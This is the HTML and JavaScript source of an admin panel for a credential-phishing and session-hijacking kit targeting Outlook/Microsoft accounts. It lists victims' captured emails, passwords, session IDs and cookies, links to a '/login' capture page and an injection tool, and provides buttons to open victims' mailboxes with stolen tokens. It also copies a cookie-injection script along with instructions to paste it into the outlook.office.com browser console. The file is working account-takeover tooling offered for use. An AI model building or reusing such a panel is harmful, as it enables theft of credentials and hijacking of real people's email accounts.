<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .admin-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5rem;
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        .controls {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        .btn-success {
            background: linear-gradient(45deg, #56ab2f, #a8e6cf);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
        }
        
        .users-table {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 20px 15px;
            text-align: left;
            font-weight: 600;
            font-size: 0.9rem;
        }
        
        td {
            padding: 15px;
            border-bottom: 1px solid #f0f0f0;
            vertical-align: middle;
        }
        
        tr:hover {
            background: rgba(102, 126, 234, 0.05);
        }
        
        .status {
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .status.captured {
            background: #d4edda;
            color: #155724;
        }
        
        .status.pending {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.expired {
            background: #f8d7da;
            color: #721c24;
        }
        
        .email {
            font-weight: 600;
            color: #667eea;
        }
        
        .actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .btn-sm {
            padding: 8px 16px;
            font-size: 12px;
            border-radius: 15px;
        }
        
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #666;
        }
        
        .empty-state h3 {
            margin-bottom: 15px;
            color: #667eea;
        }
        
        @media (max-width: 768px) {
            .admin-container {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .controls {
                flex-direction: column;
                align-items: stretch;
            }
            
            table {
                font-size: 0.8rem;
            }
            
            th, td {
                padding: 10px 8px;
            }
            
            .actions {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <div class="header">
            <h1>🛡️ Admin Dashboard</h1>
            <p>Manage captured user sessions and cookies</p>
        </div>
        
        <div class="stats" id="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalUsers">0</div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="capturedUsers">0</div>
                <div class="stat-label">Captured Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalCookies">0</div>
                <div class="stat-label">Total Cookies</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="activeUsers">0</div>
                <div class="stat-label">Active Sessions</div>
            </div>
        </div>
        
        <div class="controls">
            <button class="btn" onclick="loadUsers()">🔄 Refresh</button>
            <a href="/login" class="btn">🎯 Capture Page</a>
            <a href="/inject" class="btn">💉 Injection Tool</a>
            <button class="btn btn-danger" onclick="clearAllUsers()">🗑️ Clear All</button>
        </div>
        
        <div class="users-table">
            <div id="usersList"></div>
        </div>
    </div>

    <script>
        // Auto-load users on page load
        window.addEventListener('load', loadUsers);
        
        // Auto-refresh every 30 seconds
        setInterval(loadUsers, 30000);

        async function loadUsers() {
            try {
                const response = await fetch('/admin/users');
                const data = await response.json();
                
                if (data.success) {
                    updateStats(data.users);
                    displayUsers(data.users);
                } else {
                    document.getElementById('usersList').innerHTML = '<div class="empty-state"><h3>No users found</h3></div>';
                }
            } catch (error) {
                document.getElementById('usersList').innerHTML = '<div class="empty-state"><h3>Error loading users</h3><p>' + error.message + '</p></div>';
            }
        }
        
        function updateStats(users) {
            const totalUsers = users.length;
            const capturedUsers = users.filter(u => u.cookieStatus === 'captured' || u.cookieStatus === 'session_captured').length;
            const totalCookies = users.reduce((sum, u) => sum + ((u.allCookies && u.allCookies.length) || (u.sessionCookies && u.sessionCookies.length) || (u.microsoftCookies && u.microsoftCookies.length) || 0), 0);
            const activeUsers = users.filter(u => u.isActive).length;
            
            document.getElementById('totalUsers').textContent = totalUsers;
            document.getElementById('capturedUsers').textContent = capturedUsers;
            document.getElementById('totalCookies').textContent = totalCookies;
            document.getElementById('activeUsers').textContent = activeUsers;
        }

        function displayUsers(users) {
            const usersList = document.getElementById('usersList');
            
            if (users.length === 0) {
                usersList.innerHTML = `
                    <div class="empty-state">
                        <h3>🎯 No captured users yet</h3>
                        <p>Visit <a href="/login" style="color: #667eea;">/login</a> to start capturing sessions!</p>
                    </div>
                `;
                return;
            }
            
            usersList.innerHTML = `
                <table>
                    <thead>
                        <tr>
                            <th>👤 Email</th>
                            <th>🔐 Password</th>
                            <th>⏰ Login Time</th>
                            <th>🆔 Session ID</th>
                            <th>📊 Status</th>
                            <th>🍪 Cookies</th>
                            <th>⚡ Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${users.map((user, index) => `
                            <tr>
                                <td><span class="email">${user.email}</span></td>
                                <td>${user.password ? '•'.repeat(8) : 'N/A'}</td>
                                <td>${user.loginAttempt ? new Date(user.loginAttempt).toLocaleString() : new Date(user.createdAt).toLocaleString()}</td>
                                <td><code>${user.sessionId || user._id.slice(-6)}</code></td>
                                <td><span class="status ${user.cookieStatus}">${user.cookieStatus}</span></td>
                                <td><strong>${(user.allCookies && user.allCookies.length) || (user.sessionCookies && user.sessionCookies.length) || (user.microsoftCookies && user.microsoftCookies.length) || 0}</strong></td>
                                <td>
                                    <div class="actions">
                                        <button class="btn btn-sm btn-success" onclick="accessAccount('${user._id}')" 
                                                ${!['captured', 'session_captured'].includes(user.cookieStatus) ? 'disabled' : ''}>
                                            🚀 Access
                                        </button>
                                        <button class="btn btn-sm" onclick="injectCookies('${user._id}')" 
                                                ${!['captured', 'session_captured'].includes(user.cookieStatus) ? 'disabled' : ''}>
                                            📋 Script
                                        </button>
                                        <button class="btn btn-sm btn-danger" onclick="deleteUser('${user._id}')">
                                            🗑️
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            `;
        }

        async function accessAccount(userId) {
            // Open custom Outlook interface using tokens
            window.open(`/outlook/interface/${userId}`, '_blank');
        }
        
        function showEmails(emails, userId) {
            const popup = window.open('', '_blank', 'width=1000,height=700');
            popup.document.write(`
                <html>
                <head>
                    <title>📧 User Emails</title>
                    <style>
                        body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                        .email { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
                        .subject { font-weight: bold; color: #333; margin-bottom: 5px; }
                        .from { color: #666; font-size: 0.9em; margin-bottom: 5px; }
                        .date { color: #999; font-size: 0.8em; }
                        .preview { color: #555; margin-top: 8px; }
                        h2 { color: #667eea; }
                    </style>
                </head>
                <body>
                    <h2>📧 Emails (${emails.length} messages)</h2>
                    ${emails.map(email => `
                        <div class="email">
                            <div class="subject">${email.subject || 'No Subject'}</div>
                            <div class="from">From: ${email.from?.emailAddress?.address || 'Unknown'}</div>
                            <div class="date">${new Date(email.receivedDateTime).toLocaleString()}</div>
                            <div class="preview">${email.bodyPreview || 'No preview available'}</div>
                        </div>
                    `).join('')}
                </body>
                </html>
            `);
        }

        async function injectCookies(userId) {
            try {
                const response = await fetch(`/admin/inject-cookies/${userId}`);
                const script = await response.text();
                
                navigator.clipboard.writeText(script).then(() => {
                    showNotification('✅ Script copied! Open outlook.office.com → F12 → Console → Paste', 'success');
                }).catch(() => {
                    const popup = window.open('', '_blank', 'width=700,height=500');
                    popup.document.write(`
                        <html>
                        <head><title>Cookie Injection Script</title>
                        <style>body{font-family:Arial;padding:20px;} textarea{width:100%;height:300px;}</style>
                        </head>
                        <body>
                            <h3>🍪 Cookie Injection Script</h3>
                            <textarea>${script}</textarea>
                            <p><strong>Instructions:</strong><br>1. Open outlook.office.com<br>2. Press F12 → Console<br>3. Paste script → Press Enter</p>
                        </body>
                        </html>
                    `);
                });
                
            } catch (error) {
                showNotification('❌ Error: ' + error.message, 'error');
            }
        }
        
        async function deleteUser(userId) {
            if (!confirm('Delete this user and their cookies?')) return;
            
            try {
                const response = await fetch(`/admin/delete-user/${userId}`, { method: 'DELETE' });
                if (response.ok) {
                    showNotification('✅ User deleted', 'success');
                    loadUsers();
                } else {
                    showNotification('❌ Delete failed', 'error');
                }
            } catch (error) {
                showNotification('❌ Error: ' + error.message, 'error');
            }
        }
        
        async function clearAllUsers() {
            if (!confirm('Delete ALL users and cookies? This cannot be undone!')) return;
            
            try {
                const response = await fetch('/admin/clear-all', { method: 'DELETE' });
                if (response.ok) {
                    showNotification('✅ All users cleared', 'success');
                    loadUsers();
                } else {
                    showNotification('❌ Clear failed', 'error');
                }
            } catch (error) {
                showNotification('❌ Error: ' + error.message, 'error');
            }
        }
        
        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed; top: 20px; right: 20px; z-index: 1000;
                padding: 15px 25px; border-radius: 10px; color: white;
                font-weight: 600; box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                background: ${type === 'success' ? 'linear-gradient(45deg, #56ab2f, #a8e6cf)' : 'linear-gradient(45deg, #ff416c, #ff4b2b)'};
            `;
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => notification.remove(), 4000);
        }
    </script>
</body>
</html>
